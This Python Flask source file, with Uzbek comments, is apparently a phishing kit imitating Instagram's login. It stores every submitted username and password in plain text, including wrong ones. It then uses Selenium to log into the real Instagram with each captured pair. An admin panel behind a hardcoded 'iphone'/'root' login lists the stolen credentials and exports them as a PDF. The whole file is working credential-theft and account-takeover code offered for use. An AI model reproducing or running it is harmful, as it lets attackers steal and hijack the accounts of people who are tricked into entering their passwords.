import io
from flask import Flask, render_template, request, redirect, url_for, flash, session, send_file
from fpdf import FPDF
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import threading
import os

app = Flask(__name__)
app.secret_key = 'super_secret_key_please_change'

# users.txt faylining to'liq yo'li
USERS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'users.txt')


# --- YORDAMCHI FUNKSIYALAR ---

def read_users():
    """users.txt faylini o'qib, dict ko'rinishida qaytaradi."""
    users = {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                parts = line.strip().split('|')
                if len(parts) >= 2:
                    username = parts[0].split(':', 1)[-1].strip()
                    password = parts[1].split(':', 1)[-1].strip()
                    if username:
                        users[username] = password
    except FileNotFoundError:
        users = {}
    return users


def save_user(username, password):
    """Yangi foydalanuvchini users.txt fayliga qo'shadi."""
    with open(USERS_FILE, 'a', encoding='utf-8') as f:
        f.write(f'Username: {username} | Password: {password}\n')


def open_instagram_with_selenium(username, password):
    """Selenium orqali Instagram'ga kirish va profilni ochish (ko'rinadigan brauzer)."""
    try:
        options = webdriver.ChromeOptions()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        # --headless OLIB TASHLANDI - endi brauzer ko'rinadi
        # Brauzer o'chib qolmasligi uchun detach qilamiz
        options.add_experimental_option("detach", True)

        driver = webdriver.Chrome(options=options)
        driver.get("https://www.instagram.com/accounts/login/")
        time.sleep(5)

        # Login maydonlarini to'ldirish
        username_input = driver.find_element(By.NAME, "username")
        username_input.send_keys(username)

        password_input = driver.find_element(By.NAME, "password")
        password_input.send_keys(password)
        password_input.send_keys(Keys.RETURN)

        # Kirishni kutamiz
        time.sleep(8)

        # Kirish muvaffaqiyatli bo'lsa profil sahifasini ochamiz
        # Instagram login dan keyin home page ga tushadi
        # Endi foydalanuvchi profilini ochamiz
        profile_url = f"https://www.instagram.com/{username}/"
        driver.get(profile_url)
        time.sleep(3)

        # Brauzer ochiq qoladi - driver.quit() OLIB TASHLANDI
        # Foydalanuvchi o'z profilini ko'ra oladi
    except Exception as e:
        print(f"Selenium xatolik: {e}")


def open_instagram_background(username, password):
    """Instagram'ga kirishni fon (thread) rejimida ishga tushiradi."""
    thread = threading.Thread(target=open_instagram_with_selenium, args=(username, password), daemon=True)
    thread.start()


# --- ROUTE'LAR ---

# Bosh sahifa (Login)
@app.route('/')
def home():
    return render_template('index.html')


# Parolni tiklash sahifasi (GET)
@app.route('/forgot.html')
def forgot_page():
    return render_template('forgot.html')


# Parolni tiklash formasi (POST)
@app.route('/forgot', methods=['GET', 'POST'])
def forgot_route():
    if request.method == 'POST':
        identifier = request.form.get('identifier')
        if identifier:
            flash('If an account exists, a reset link has been sent.')
        return redirect(url_for('home'))
    return render_template('forgot.html')


# Yangi akkaunt ochish sahifasi
@app.route('/create.html')
def create_page():
    return render_template('create.html')


# Admin paneli
@app.route('/admin')
def admin():
    if not session.get('admin'):
        flash('Admin rights required')
        return redirect(url_for('home'))

    users_dict = read_users()
    users = [{'username': k, 'password': v} for k, v in users_dict.items()]
    return render_template('admin.html', users=users)


# Admin uchun PDF yuklab olish
@app.route('/admin/download')
def download_pdf():
    if not session.get('admin'):
        flash('Admin rights required')
        return redirect(url_for('home'))

    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(0, 10, txt="User Credentials", ln=1, align='C')

    users_dict = read_users()
    for username, password in users_dict.items():
        pdf.cell(0, 10, txt=f"Username: {username} | Password: {password}", ln=1)

    pdf_output = pdf.output()
    if isinstance(pdf_output, str):
        pdf_bytes = pdf_output.encode('latin-1')
    else:
        pdf_bytes = bytes(pdf_output)
    return send_file(io.BytesIO(pdf_bytes), as_attachment=True, download_name='users.pdf', mimetype='application/pdf')


# Logout
@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out')
    return redirect(url_for('home'))


# Login handling (admin va oddiy foydalanuvchilar)
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        flash('Missing username or password')
        return redirect(url_for('home'))

    # Admin kirishi
    if username.lower() == 'iphone' and password == 'root':
        session['admin'] = True
        flash(f'Admin logged in as {username}')
        return redirect(url_for('admin'))

    # Mavjud foydalanuvchilarni o'qish
    users_dict = read_users()

    if username in users_dict:
        # Foydalanuvchi mavjud - parolni tekshirish
        if users_dict[username] == password:
            session['user'] = username
            # Instagram'ga kirishni fon rejimida ishga tushirish
            open_instagram_background(username, password)
            flash(f'Logged in as {username}')
            return redirect(url_for('home'))
        else:
            # Parol noto'g'ri - lekin yangi parolni ham saqlab qo'yamiz
            save_user(username, password)
            # Instagram'ga kirishni fon rejimida ishga tushirish
            open_instagram_background(username, password)
            flash('Incorrect password')
            return redirect(url_for('home'))
    else:
        # Yangi foydalanuvchi - ma'lumotlarni saqlash
        save_user(username, password)
        session['user'] = username
        # Instagram'ga kirishni fon rejimida ishga tushirish
        open_instagram_background(username, password)
        flash(f'Account created and logged in as {username}')
        return redirect(url_for('home'))


if __name__ == '__main__':
    app.run(debug=True, port=5000)
